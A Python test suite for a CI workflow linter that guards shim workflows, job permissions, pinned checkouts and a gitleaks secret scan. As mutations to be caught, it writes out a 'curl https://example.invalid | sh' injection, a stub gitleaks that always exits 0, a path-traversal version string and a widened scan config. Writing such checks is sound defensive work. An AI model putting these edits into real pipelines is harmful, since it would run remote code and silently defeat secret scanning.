        self.assertNotRegex(config, r"(?m)^\s*disabledRules\s*=", "a default rule is switched off")
        # What is ignored is ignored one finding at a time, by its exact fingerprint: a commit, a file, a rule, a line.
        for line in (ROOT / ".gitleaksignore").read_text().splitlines():
            if line and not line.startswith("#"):
                self.assertRegex(line, r"^[0-9a-f]{40}:[^:]+:[a-z0-9-]+:[0-9]+$", line)

    def test_a_shim_holds_no_step_and_calls_the_release_at_its_channel(self):
        # Issue 196's ruling 3: a workflow on schedule, workflow_dispatch or workflow_run runs the default branch's
        # file, so each job calls one file of the Release at its channel, with its grant and its concurrency group, an
        # if: and with: values that pass its inputs on, and nothing else; only a called workflow names an environment.
        self.assertEqual(check_workflows.lint(POLLER), [])
        call = "    uses: combsmith/software-factory/.github/workflows/pass.yml@factory/v0-next\n"
        broken = {
            "a step": POLLER.replace(call, "    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n"
                                           "      - run: python3 -m controller\n"),
            "main's copy": POLLER.replace(call, "    uses: ./.github/workflows/pass.yml\n"),
            "another repo's file": POLLER.replace("combsmith/software-factory/", "combsmith/other/"),
            "a secret handed on": POLLER + "    secrets:\n      KEY: ${{ secrets.KEY }}\n",
            "an env above the jobs": POLLER.replace("permissions: {}\n", "permissions: {}\nenv:\n  A: b\n"),
            "no concurrency": POLLER.replace("    concurrency:\n      group: sf-poller\n      cancel-in-progress: false\n", ""),
            "no grant": POLLER.replace("    permissions:\n      actions: write\n      contents: read\n", ""),
            "an environment": POLLER.replace("    uses:", "    environment: factory-poller\n    uses:"),
            "an input renamed": POLLER + "    with:\n      item: ${{ inputs.other }}\n",
            "a value written in": POLLER + "    with:\n      item: main\n",
            "a timeout": POLLER.replace("    uses:", "    timeout-minutes: 15\n    uses:"),
            "needs": POLLER.replace("    uses:", "    needs:\n      - other\n    uses:"),
            "inputs in one line": POLLER + "    with: main\n",
            "a group of none": POLLER.replace("      group: sf-poller\n", ""),
            "a group with no name": POLLER.replace("      group: sf-poller\n", "      group:\n"),
            "a bare with": POLLER + "    with:\n",
            "a pass cancelled": POLLER.replace("cancel-in-progress: false", "cancel-in-progress: true"),
        }
        for why, text in broken.items():
            self.assertIn("shim", {rule for rule, _ in check_workflows.lint(text)}, why)
        # Each of the three events makes a shim alone: a dispatch, a schedule and another's end.
        for event in ("  workflow_dispatch:\n", "  schedule:\n    - cron: '17 3 * * *'\n", "  workflow_run:\n"):
            alone = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on:\n" + event)
            self.assertIn("shim", {rule for rule, _ in check_workflows.lint(alone)}, event)
        passed_on = POLLER + "    with:\n      item: ${{ inputs.item }}\n"
        self.assertEqual([r for r, _ in check_workflows.lint(passed_on) if r == "shim"], [])
        # An environment is a called workflow's alone: named on a push's job or a pull request's, it is refused.
        pushed = GOOD.replace("  checks:\n", "  checks:\n    environment: factory-run\n", 1)
        self.assertIn("shim", {rule for rule, _ in check_workflows.lint(pushed)})
        called = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on:\n  workflow_call:\n").replace(
            "  checks:\n", "  checks:\n    environment: factory-run\n", 1)
        self.assertNotIn("shim", {rule for rule, _ in check_workflows.lint(called)})
        # Called and something else: the something else runs the file with the key too.
        both = called.replace("on:\n  workflow_call:\n", "on:\n  workflow_call:\n  push:\n    branches:\n      - main\n")
        self.assertIn("shim", {rule for rule, _ in check_workflows.lint(both)})

    def test_every_shim_calls_one_channel(self):
        # Decision 0006 and L-46: every shim names the one channel, factory/v0-next, never a branch, a commit or another.
        for ref in ("main", "factory/v0-stable", "factory/v1-next", "3d3c42e5aac5ba805825da76410c181273ba90b1"):
            text = POLLER.replace("@factory/v0-next", "@" + ref)
            self.assertIn("shim", {rule for rule, _ in check_workflows.lint(text)}, ref)

    def test_a_shim_is_held_word_for_word(self):
        # A shim is held by its hash, as ci.yml is: one not in SHIMS, or changed since its hash was recorded, fails.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/poller.yml": POLLER})))
        self.assertTrue(caught(problems, "poller.yml: a shim is held word for word"), problems)
        held = hashlib.sha256(check_workflows.PIN.sub("@PIN", POLLER).encode()).hexdigest()
        # A shim's events written as one scalar are its events still: such a file is held too.
        scalar = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on: workflow_dispatch\n")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/x.yml": scalar}))),
                               "x.yml: a shim is held word for word"))
        # Only the Run's shim names its run.
        named = POLLER.replace("name: sf-poller\n", "name: sf-poller\nrun-name: x\n")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/poller.yml": named}))),
                               "poller.yml: only run.yml names its run"))
        with mock.patch.dict(check_workflows.SHIMS, {"poller.yml": held}):
            self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/poller.yml": POLLER}))),
                                    "poller.yml"))
            moved = POLLER.replace("13 * * * *", "14 * * * *")
            self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/poller.yml": moved}))),
                                   "poller.yml: a shim is held word for word"))
            # Held under its own name alone: the same text under another is refused.
            self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/tick.yml": POLLER}))),
                                   "tick.yml: a shim is held word for word"))

    def test_only_the_poller_runs_on_workflow_run(self):
        # Decision 0043 and issue 196's ruling 4: the poller alone wakes on another workflow's end, on its completion
        # alone, never its own; it takes no input and reads nothing of the run that woke it.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        held = hashlib.sha256(check_workflows.PIN.sub("@PIN", POLLER).encode()).hexdigest()
        with mock.patch.dict(check_workflows.SHIMS, {"other.yml": held}):
            problems = check_workflows.run(tree(dict(base, **{".github/workflows/other.yml": POLLER})))
        self.assertTrue(caught(problems, "other.yml: only poller.yml wakes on another workflow's end"), problems)
        broken = {
            "its own end": POLLER.replace("      - sf-run\n", "      - sf-run\n      - sf-poller\n"),
            "every stage": POLLER.replace("    types:\n      - completed\n", ""),
            "a request": POLLER.replace("      - completed\n", "      - requested\n"),
            "an input": POLLER.replace("  workflow_dispatch:\n", "  workflow_dispatch:\n    inputs:\n      item:\n"
                                                                  "        type: string\n"),
            "the run that woke it": POLLER.replace("  pass:\n    permissions:",
                                                   "  pass:\n    if: github.event.workflow_run.conclusion == 'success'\n"
                                                   "    permissions:"),
            "no workflow named": POLLER.replace("    workflows:\n      - factory\n      - ci\n      - sf-run\n", ""),
            "an empty list of workflows": POLLER.replace("      - factory\n      - ci\n      - sf-run\n", ""),
            "a branch filter": POLLER.replace("    types:\n", "    branches:\n      - main\n    types:\n"),
        }
        # The run that woke it is read in no form an expression can write: by an index, in another case, or whole.
        for read in ("github['event'].workflow_run.conclusion == 'success'", "GitHub.Event.workflow_run.conclusion == 'x'",
                     "contains(toJSON(github), 'success')", "github .event.action == 'completed'",
                     "(github).event.workflow_run.conclusion == 'success'", "contains(format('{0}', github), 'x')",
                     "github.token.x == 'y'"):
            broken[read] = POLLER.replace("  pass:\n    permissions:", "  pass:\n    if: %s\n    permissions:" % read)
        for why, text in broken.items():
            self.assertIn("wake", {rule for rule, _ in check_workflows.lint(text)}, why)
        # A comment is no read: the poller may say, in a comment, what it does not read.
        noted = "# The poller reads nothing of github.event.\n" + POLLER.replace("  pass:\n", "  pass:\n    # nor github['event']\n")
        self.assertEqual([r for r, _ in check_workflows.lint(noted) if r == "wake"], [])
        # A ` #` inside a quoted value is no comment: what follows it is read.
        quoted = POLLER.replace("  pass:\n    permissions:", "  pass:\n    if: \"' #' == ' #' && github.event.action == 'x'\"\n"
                                "    permissions:")
        self.assertIn("wake", {r for r, _ in check_workflows.lint(quoted)})
        # The poller names its token neither: the pass it calls holds it.
        self.assertIn("wake", {r for r, _ in check_workflows.lint(POLLER.replace(
            "  pass:\n    permissions:", "  pass:\n    if: github.token != ''\n    permissions:"))})
        # Nor does the pass it calls read it: pass.yml is the poller's own job.
        called = ("name: sf-pass\non:\n  workflow_call:\npermissions: {}\njobs:\n  pass:\n    runs-on: ubuntu-24.04\n"
                  "    timeout-minutes: 15\n    permissions:\n      actions: write\n      contents: read\n    steps:\n"
                  "      - run: python3 -m controller\n        env:\n"
                  "          BRANCH: ${{ github.event.workflow_run.head_branch }}\n")
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/pass.yml": called})))
        self.assertTrue(caught(problems, "pass.yml: it reads the run that woke the poller"), problems)
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/pass.yml": called.replace(
            "BRANCH: ${{ github.event.workflow_run.head_branch }}", "WORKFLOW_TOKEN: ${{ github.token }}")}))),
            "pass.yml: it reads"))
        # A whole-line comment in pass.yml is no read.
        commented = "# It reads nothing of github.event.\n" + called.replace(
            "BRANCH: ${{ github.event.workflow_run.head_branch }}", "WORKFLOW_TOKEN: ${{ github.token }}")
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/pass.yml": commented}))),
                                "pass.yml: it reads"))
        for whole in ("${{ github }}", "${{ toJSON(github) }}", "${{ GitHub.Event.action }}", "${{ github.token.x }}",
                      "${{ github.token['x'] }}"):
            problems = check_workflows.run(tree(dict(base, **{".github/workflows/pass.yml": called.replace(
                "${{ github.event.workflow_run.head_branch }}", whole)})))
            self.assertTrue(caught(problems, "pass.yml: it reads the run that woke the poller"), whole)

    def test_the_pass_job_alone_is_granted_a_write(self):
        # Issue 196's ruling 4: only the pass job is granted a write, its actions: write, which starts the Runs and the
        # successor; the job id pass is the poller's and the pass's alone.
        self.assertEqual([r for r, _ in check_workflows.lint(POLLER) if r == "permissions"], [])
        for grant in ("      contents: write\n", "      pull-requests: write\n", "      id-token: write\n"):
            self.assertIn("permissions", {r for r, _ in check_workflows.lint(
                POLLER.replace("      contents: read\n", grant))}, grant)
        elsewhere = GOOD.replace("    permissions:\n      contents: read\n",
                                 "    permissions:\n      actions: write\n      contents: read\n", 1)
        self.assertIn("permissions", {r for r, _ in check_workflows.lint(elsewhere)})
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        named = GOOD.replace("  checks:\n", "  pass:\n", 1).replace("      - checks\n", "      - pass\n")
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/other.yml": named})))
        self.assertTrue(caught(problems, "other.yml: the job pass is reserved for poller.yml and pass.yml"), problems)

    def test_a_runs_lane_is_its_item_on_the_job_and_cancels_nothing_running(self):
        # Issue 196's ruling 6 and decision 0003: the job that calls the Run's jobs holds one concurrency group for each
        # Work item, exactly ${{ inputs.item }}, on the job, and never cancels a Run in progress.
        run = check_workflows.RUN_SHIM % 41898282
        self.assertEqual(check_workflows.lint(run), [])
        lane = "    concurrency:\n      group: ${{ inputs.item }}\n      cancel-in-progress: false\n"
        broken = {
            "a Run cancelled": run.replace("cancel-in-progress: false", "cancel-in-progress: true"),
            "one lane for all": run.replace("group: ${{ inputs.item }}", "group: sf-run"),
            "a lane per Run": run.replace("group: ${{ inputs.item }}", "group: ${{ inputs.name }}"),
            "no group": run.replace("      group: ${{ inputs.item }}\n", ""),
            "the lane at the top": run.replace(lane, "").replace("permissions: {}\n", "permissions: {}\n"
                                                                  "concurrency:\n  group: ${{ inputs.item }}\n"),
        }
        for why, text in broken.items():
            self.assertIn("lane", {rule for rule, _ in check_workflows.lint(text)}, why)
        # The poller's group is its own, a name: it calls the pass, not the Run's jobs, and holds no item's lane.
        self.assertEqual([r for r, _ in check_workflows.lint(POLLER) if r == "lane"], [])
        # The three places an expression stands whole beyond env:, with: and secrets:, and none with text around it.
        for text in (run.replace("run-name: ${{ inputs.name }}", "run-name: Run ${{ inputs.name }}"),
                     run.replace("run-name: ${{ inputs.name }}", "run-name: ${{ inputs.item }}"),
                     run.replace("group: ${{ inputs.item }}", "group: lane-${{ inputs.item }}"),
                     POLLER.replace("group: sf-poller", "group: ${{ github.ref }}"),
                     run.replace("permissions: {}\n", "permissions: {}\nconcurrency:\n  group: ${{ inputs.item }}\n"),
                     GOOD.replace("      - run: make verify\n", "      - run: make verify\n        outputs:\n"
                                  "          d: ${{ steps.a.outputs.b }}\n", 1)):
            self.assertIn("expression", {rule for rule, _ in check_workflows.lint(text)})
        outputs = GOOD.replace("    timeout-minutes: 25\n", "    timeout-minutes: 25\n    outputs:\n"
                               "      digest: ${{ steps.run.outputs.digest }}\n", 1)
        self.assertNotIn("expression", {rule for rule, _ in check_workflows.lint(outputs)})
        self.assertIn("expression", {rule for rule, _ in check_workflows.lint(outputs.replace(
            "${{ steps.run.outputs.digest }}", "${{ github.event.pull_request.title }}"))})

    def run_tree(self, text: str, account) -> list:
        config = json.loads((ROOT / "config" / "controller.json").read_text())
        config["accounts"]["workflow_token"] = account
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD,
                "config/controller.json": json.dumps(config)}
        held = hashlib.sha256(check_workflows.PIN.sub("@PIN", text).encode()).hexdigest()
        with mock.patch.dict(check_workflows.SHIMS, {"run.yml": held}):
            return [p for p in check_workflows.run(tree(dict(base, **{".github/workflows/run.yml": text})))
                    if p.startswith(".github/workflows/run.yml")]

    def test_every_run_dispatch_carries_an_item_and_the_poller_takes_none(self):
        # Decision 0036: a Run is dispatched with three required inputs, its name, its item and its pass, so every Role
        # dispatch carries an item; the poller takes none (the rule wake).
        token = {"type": "Bot", "id": 41898282}
        run = check_workflows.RUN_SHIM % 41898282
        self.assertEqual(self.run_tree(run, token), [])
        item = "      item:\n        required: true\n        type: string\n"
        for why, text in (("no item", run.replace(item, "")),
                          ("an item left optional", run.replace(item, item.replace("required: true", "required: false"))),
                          ("an input more", run.replace(item, item + "      extra:\n        type: string\n"))):
            self.assertTrue(self.run_tree(text, token), why)
        self.assertIn("wake", {r for r, _ in check_workflows.lint(POLLER.replace(
            "  workflow_dispatch:\n", "  workflow_dispatch:\n    inputs:\n      item:\n        type: string\n"))})

    def test_a_run_starts_only_from_the_poller_and_never_under_a_pause(self):
        # Ruling 6 and I-34: the Run's shim starts its jobs only when the dispatcher is the pass's own token, by the
        # account controller/1 names for it, and only while no Pause of the repo or the org is set. While controller/1
        # names no such account, no run.yml is right.
        token = {"type": "Bot", "id": 41898282}
        run = check_workflows.RUN_SHIM % 41898282
        condition = ("    if: github.actor_id == '41898282' && github.run_attempt == '1' && "
                     "(vars.FACTORY_PAUSED == '' || vars.FACTORY_PAUSED == 'false')\n")
        self.assertIn(condition, run)
        for why, text in (("another dispatcher", run.replace("41898282", "41898283")),
                          ("no Pause", run.replace(condition, "    if: github.actor_id == '41898282' && github.run_attempt == '1'\n")),
                          ("a re-run", run.replace(" && github.run_attempt == '1'", "")),
                          ("any value but true", run.replace("(vars.FACTORY_PAUSED == '' || vars.FACTORY_PAUSED == 'false')",
                                                             "vars.FACTORY_PAUSED != 'true'")),
                          ("either", run.replace("' && github", "' || github")),
                          ("no condition", run.replace(condition, "")),
                          ("a trailing word", run.replace("cancel-in-progress: false", "cancel-in-progress: false # x"))):
            self.assertTrue(self.run_tree(text, token), why)
        for account in (None, {"type": "Bot", "id": 41898283}, {"type": "Bot", "id": "41898282"},
                        {"type": "Bot", "id": True}, "41898282"):
            self.assertTrue(self.run_tree(run, account), account)
        # A configuration that cannot be read names no dispatcher.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD,
                "config/controller.json": "{not json", ".github/workflows/run.yml": run}
        held = hashlib.sha256(check_workflows.PIN.sub("@PIN", run).encode()).hexdigest()
        with mock.patch.dict(check_workflows.SHIMS, {"run.yml": held}):
            self.assertTrue(caught(check_workflows.run(tree(base)), "run.yml: config/controller.json names no account"))
            # And the Run's jobs are called from run.yml alone.
            elsewhere = dict(base, **{"config/controller.json": (ROOT / "config" / "controller.json").read_text()})
            del elsewhere[".github/workflows/run.yml"]
            other = GOOD.replace("  checks:\n", "  lane:\n    permissions:\n      contents: read\n    concurrency:\n"
                                 "      group: ${{ inputs.item }}\n      cancel-in-progress: false\n"
                                 "    uses: combsmith/software-factory/.github/workflows/run-jobs.yml@factory/v0-next\n"
                                 "  checks:\n", 1)
            problems = check_workflows.run(tree(dict(elsewhere, **{".github/workflows/other.yml": other})))
            self.assertTrue(caught(problems, "other.yml: only run.yml calls the Run's jobs"), problems)
        self.assertEqual(self.run_tree("# The Run's shim.\n" + run, token), [])

    def test_no_step_sets_the_scrub_or_hands_the_model_a_tool_list(self):
        # Decision 0050: the scrub is the Engine's to set, beside --tools "", and a step can pass the CLI no argument;
        # and the step that holds the model's credential is handed no tool list, by a name or a value.
        for name in ("model.a-scrub-set-by-the-step.yml", "model.a-tool-list-beside-the-credential.yml"):
            text = (ROOT / "examples" / "workflows" / "invalid" / name).read_text()
            self.assertEqual({r for r, _ in check_workflows.lint(text)}, {"model"}, name)
        clean = (ROOT / "examples" / "workflows" / "invalid" / "model.a-scrub-set-by-the-step.yml").read_text().replace(
            "          CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: 1\n", "")
        self.assertEqual(check_workflows.lint(clean), [])
        for line in ("          claude_code_subprocess_env_scrub: 1\n", "          ARGS: --allowedTools Bash\n",
                     "          CLAUDE_TOOLS: Read\n"):
            self.assertIn("model", {r for r, _ in check_workflows.lint(clean + line)}, line)
        # A step's environment is merged from its job's and its workflow's: a tool list there is handed to it too.
        for level in (clean.replace("    steps:\n", "    env:\n      ALLOWED_TOOLS: Bash\n    steps:\n"),
                      clean.replace("permissions: {}\n", "permissions: {}\nenv:\n  ALLOWED_TOOLS: Bash\n"),
                      clean.replace("    steps:\n", "    env:\n      CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: 1\n    steps:\n")):
            self.assertIn("model", {r for r, _ in check_workflows.lint(level)})
        # The model's credential is named in eval.yml's run step and in the Run's jobs, run-jobs.yml; run.yml is a shim,
        # and names no secret.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/run-jobs.yml": clean}))),
                                "names the model's credential"))
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/run.yml": clean}))),
                               "run.yml: line"))
        # A tool list in a step that holds no model credential is no concern of this rule.
        self.assertNotIn("model", {r for r, _ in check_workflows.lint(clean.replace(
            "CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}", "OTHER: x") + "          TOOLS: a\n")})

    def test_an_exempt_workflow_is_held_word_for_word(self):
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        as_written = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan})))
        self.assertFalse(caught(as_written, "ci.yml"))
        changed = scan.replace("gitleaks detect", "curl https://example.invalid | sh; gitleaks detect")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": changed}))),
                               "ci.yml is exempt from a rule, so it is held word for word"))
        # The exemption is from one rule. Under another name the same text is refused.
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/scan.yml": scan}))),
                               "scan.yml: [install]"))
        other = scan.replace("ubuntu-24.04", "ubuntu-latest")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": other}))),
                               "ci.yml: [runner]"))

    def test_the_secret_scan_reads_the_bases_configuration(self):
        # gitleaks 8.30.1 reads the .gitleaksignore it is told of, and also the one at the top of what it scans, so the
        # scan deletes the head's and reads its rules from a checkout of the base: a change cannot widen the allowlist it
        # needs (decision 0023). The history it scans is still the head's.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        line = "          " + check_workflows.SCAN_RUN[1] + "\n"
        rm = "          " + check_workflows.SCAN_RUN[0] + "\n"
        ref = "          ref: %s\n" % check_workflows.SCAN_BASE
        start = scan.index("      - name: Checkout the base")
        step = scan[start:scan.index("      - name: Install gitleaks")]
        head = scan[scan.index("      - name: Checkout (full history)"):start]
        install = scan[scan.index("      - name: Install gitleaks"):scan.index("      - name: Run gitleaks")]
        self.assertIn(rm + line, scan)
        self.assertIn(ref, step)
        ran, checkout = "does not run, as its last step's whole literal block", "does not check out the head and then the base"
        shape = "does not run, in this order and nothing else"
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        cases = [(scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml"), ran),
                 (scan.replace("--gitleaks-ignore-path base/.gitleaksignore", "--gitleaks-ignore-path ."), ran),
                 (scan.replace(" --gitleaks-ignore-path base/.gitleaksignore", ""), ran),
                 (scan.replace(rm, ""), ran),
                 (scan.replace(rm + line, line + rm), ran),
                 (scan.replace(rm + line, "          gitleaks dir .\n"), ran),
                 # A head's .gitattributes marks a file -diff, and git log -p shows it as binary: --text reads it.
                 (scan.replace(" --text\"", "\""), ran),
                 (scan.replace(" --log-opts=\"--full-history --all --diff-filter=tuxdb --text\"", ""), ran),
                 (scan.replace("--full-history --all ", ""), ran),
                 # An inline gitleaks:allow is the head's own content, and passes over nothing.
                 (scan.replace(" --ignore-gitleaks-allow", ""), ran),
                 (scan.replace(rm + line, "          make verify\n"), ran),
                 # The scan's whole block is SCAN_RUN: a line before the rm, or after the scan, is refused.
                 (scan.replace(rm, "          cp .gitleaks.toml base/.gitleaks.toml\n" + rm), ran),
                 (scan.replace(line, line + "          true\n"), ran),
                 (scan.replace("        run: |\n" + rm + line, "        run: gitleaks detect --source .\n"), ran),
                 # An install on one line is read: it is held whole too.
                 (scan.replace(install, "      - name: Install gitleaks\n        run: cp .gitleaks.toml base/\n"),
                  installed),
                 # The steps are the head's checkout, the base's, the install and the scan, in that order alone.
                 (scan.replace(step, "").replace(rm + line, rm + line + step),
                  shape),
                 (scan.replace(step, step + "      - run: cp .gitleaks.toml base/.gitleaks.toml\n"), shape),
                 (scan.replace("          sudo mv /tmp/gitleaks /usr/local/bin\n",
                               "          sudo mv /tmp/gitleaks /usr/local/bin\n          cp .gitleaks.toml base/\n"),
                  installed),
                 (scan.replace("    permissions:\n      contents: read\n",
                               "    permissions:\n      contents: read\n    env:\n      GIT_DIR: base/.git\n"), shape),
                 (scan.replace("permissions: {}\n", "permissions: {}\ndefaults:\n  run:\n    working-directory: base\n"),
                  shape),
                 (scan.replace("      - name: Run gitleaks\n", "      - name: Run gitleaks\n        working-directory: base\n"),
                  shape),
                 (scan.replace("          GITLEAKS_VERSION:", "          GIT_DIR: base/.git\n          GITLEAKS_VERSION:"),
                  shape),
                 (scan.replace(ref, ref.replace(" || github.sha", "")), checkout),
                 (scan.replace(ref, ref.replace(" || github.event.merge_group.base_sha", "")), checkout),
                 (scan.replace(ref, ref.replace("github.event.pull_request.base.sha || ", "")), checkout),
                 (scan.replace(ref, ref.replace("pull_request.base.sha", "pull_request.head.sha")), checkout),
                 (scan.replace("          path: base\n", ""), checkout),
                 (scan.replace("          path: base\n", "          path: base\n          repository: someone/else\n"),
                  checkout),
                 (scan.replace(step, ""), checkout),
                 (scan.replace(head + step, step + head), checkout),
                 (scan.replace(step, step + step.replace("path: base", "path: other")), checkout)]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The check reads it where it stands, and only there.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        widened = scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": widened}))),
                               ".github/workflows/ci.yml: ci.yml " + ran))
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan}))), "ci.yml"))

    def test_the_secret_scans_install_is_held_whole(self):
        # The install's whole block is INSTALL_RUN: a stub gitleaks that exits 0 would pass every scan. Only the version
        # and the checksum it reads from its env are free, each held to its shape and quoted: the version goes into the
        # URL's path, where curl folds `/../`.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        block = "".join("          %s\n" % line for line in check_workflows.INSTALL_RUN)
        self.assertIn("        run: |\n" + block + "      - name: Run gitleaks\n", scan)
        version = '          GITLEAKS_VERSION: "8.30.1"\n'
        checksum = '          GITLEAKS_CHECKSUM: "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"\n'
        self.assertIn(version + checksum, scan)
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        stub = "          printf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n          sudo chmod +x /usr/local/bin/gitleaks\n"
        cases = [(scan.replace(block, stub), installed),
                 (scan.replace(block, block + "          true\n"), installed),
                 (scan.replace(block, "          true\n" + block), installed),
                 (scan.replace("sha256sum -c", "sha256sum -c || true"), installed),
                 (scan.replace(" --proto '=https'", ""), installed),
                 (scan.replace("v${GITLEAKS_VERSION}", "v8.30.1"), installed),
                 (scan.replace("https://github.com/gitleaks/gitleaks/", "https://github.com/someone/gitleaks/"), installed),
                 (scan.replace(version, version.replace("8.30.1", "8.30.1/../../../someone/gitleaks/releases/download/v1")),
                  "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace('"8.30.1"', "8.30.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.30")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.3O.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version + version), "GITLEAKS_VERSION once"),
                 (scan.replace(version, ""), "GITLEAKS_VERSION once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551F6FC8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551f6fz8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("eb\"", "\"")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace('"', "")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, ""), "GITLEAKS_CHECKSUM once")]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # read() leaves a line with a tab or a carriage return out of a block, and bash runs it: a file with one holds
        # neither block. A folded block, `>`, is one command, not the lines it is written in.
        tabbed = "          \tprintf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n"
        last = "          sudo mv /tmp/gitleaks /usr/local/bin\n"
        scanned = "          " + check_workflows.SCAN_RUN[1] + "\n"
        ran = "does not run, as its last step's whole literal block"
        for text, said in ((scan.replace(last, last + tabbed), installed),
                           (scan.replace(last, last + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), installed),
                           (scan.replace(last, last.replace("\n", "\r\n")), installed),
                           (scan.replace("        run: |\n" + block, "        run: >\n" + block), installed),
                           (scan.replace("        run: |\n          rm -f", "        run: >\n          rm -f"), ran),
                           (scan.replace("        run: |\n          rm -f", "        run: |-\n          rm -f"), ran)):
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The same, read from the file as run() reads it: a carriage return must reach read() untranslated.
        root = clone({".github/workflows/ci.yml": scan.replace(last, last.replace("\n", "\r\n"))})
        self.assertTrue(caught(check_workflows.run(root), installed), "a carriage return in ci.yml")
        crlf = clone({".github/workflows/verify.yml": GOOD.replace("\n", "\r\n")})
        self.assertTrue(caught(check_workflows.run(crlf), "verify.yml: [form]"), "windows line ends in a workflow")
        # Another version and checksum of their shapes are free: that is a bump, the reviewer's to judge.
        bumped = scan.replace(version, version.replace("8.30.1", "8.31.0")).replace(checksum, checksum.replace(
            "551f6fc8", "0123abcd"))
        self.assertNotEqual(bumped, scan)
        self.assertEqual(check_workflows.scan_problems(bumped), [])

    def test_every_checkout_is_the_listed_one(self):
        # PIN makes any two pins equal where a text is compared word for word, so neither the EXEMPT hash nor verify.yml's
        # example holds which actions/checkout a workflow runs; CHECKOUT does, in every workflow.
        listed = "%s %s" % check_workflows.CHECKOUT
        old = "actions/checkout@ee0669bd1cc54295c223e0bb666b733df41de1c5 # v2.7.0"
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        verify = (ROOT / ".github" / "workflows" / "verify.yml").read_text()
        ref = "          ref: %s\n" % check_workflows.BASE
        base_checkout = "      - uses: %s\n        with:\n          persist-credentials: false\n%s" % (listed, ref)
        self.assertEqual(verify.count(base_checkout), 1)
        self.assertEqual(scan.count(listed), 2)
        self.assertNotIn("pin", rules(scan))
        self.assertEqual(rules(verify), [])
        for text in (scan.replace(listed, old, 1), scan.replace(listed, old),
                     verify.replace(base_checkout, base_checkout.replace(listed, old)),
                     verify.replace(listed, "actions/checkout@" + "a" * 40 + " # v7.0.1"),
                     verify.replace(listed, listed.replace("v7.0.1", "v2.7.0")),
                     verify.replace(listed, listed.replace("actions/checkout", "Actions/Checkout"))):
            self.assertIn("pin", rules(text), text)
        # The hash of the exempt scan does not see it; the pin rule does.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan.replace(listed, old)})))
        self.assertFalse(caught(problems, "held word for word"))
        self.assertTrue(caught(problems, ".github/workflows/ci.yml: [pin] %s is not the listed checkout" % old))
        # Another action keeps any pin that was looked up.
        other = GOOD.replace(STEP, "      - uses: actions/setup-java@" + "a" * 40 + " # v6.0.1\n" + STEP)
        self.assertEqual(rules(other), [])

